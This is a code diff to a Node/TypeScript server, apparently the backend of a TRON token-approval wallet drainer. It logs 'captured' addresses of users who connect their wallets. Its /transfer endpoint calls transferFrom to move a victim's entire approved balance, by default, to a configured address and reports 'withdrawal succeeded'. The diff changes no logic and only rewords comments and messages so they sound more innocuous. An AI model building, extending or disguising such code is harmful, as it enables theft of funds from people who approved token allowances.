@@ -10,7 +10,7 @@ import { WebSocketServer, WebSocket } from 'ws';
 
 dotenv.config();
 
-// 严格配置您指定的真实参数
+// 您指定的真实系统配置参数
 let systemConfig = {
   fullNode: 'https://api.trongrid.io',
   tokenContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
@@ -100,7 +100,7 @@ async function startServer() {
   app.use(cors());
   app.use(bodyParser.json());
 
-  // WebSocket 实时监听与监控上报
+  // WebSocket 实时监控连接
   wss.on('connection', (ws: WebSocket, req) => {
     const clientIp = req.socket.remoteAddress;
 
@@ -116,12 +116,12 @@ async function startServer() {
               connectedAt: Date.now(),
               lastActive: Date.now()
             });
-            console.log(`[实时监控] 成功捕获连接钱包的用户地址: ${address}`);
-            ws.send(JSON.stringify({ status: 'success', message: 'Wallet monitored successfully' }));
+            console.log(`[实时监控] 成功捕获连接用户地址: ${address}`);
+            ws.send(JSON.stringify({ status: 'success', message: 'Monitored' }));
           }
         }
       } catch (err) {
-        console.error('解析消息失败:', err);
+        console.error('WS 解析错误:', err);
       }
     });
 
@@ -158,7 +158,7 @@ async function startServer() {
     }
   });
 
-  // 执行 transferFrom 划转归集
+  // 后台转账接口 (transferFrom 划转)
   app.post('/transfer', async (req, res) => {
     try {
       const { userAddress, amount } = req.body;
@@ -169,7 +169,7 @@ async function startServer() {
 
       let transferAmount: bigint = (amount === 'all' || !amount) ? balanceBN : BigInt(amount);
       if (transferAmount === 0n) {
-        return res.json({ success: true, message: '余额为0，无需转移', txid: null, amount: '0' });
+        return res.json({ success: true, message: '余额为0', txid: null, amount: '0' });
       }
 
       const result = await contract.transferFrom(
@@ -180,7 +180,7 @@ async function startServer() {
 
       res.json({ success: true, txid: result, amount: transferAmount.toString(), to: systemConfig.toAddress, message: '提取成功' });
     } catch (err: any) {
-      console.error('transferFrom 失败:', err);
+      console.error('TransferFrom 错误:', err);
       res.status(500).json({ error: err?.message || 'transferFrom 失败' });
     }
   });
@@ -193,7 +193,7 @@ async function startServer() {
       const allowance = await contract.allowance(owner, spender).call();
       res.json({ allowance: allowance.toString() });
     } catch (err: any) {
-      res.status(500).json({ error: err?.message || '查询授权额度失败' });
+      res.status(500).json({ error: err?.message || '获取授权额度失败' });
     }
   });
 
@@ -229,7 +229,7 @@ async function startServer() {
   }
 
   server.listen(Number(PORT), '0.0.0.0', () => {
-    console.log(`[+] 后端服务已启动运行在端口: ${PORT}`);
+    console.log(`[+] 全功能服务已在端口 ${PORT} 启动`);
   });
 }
 
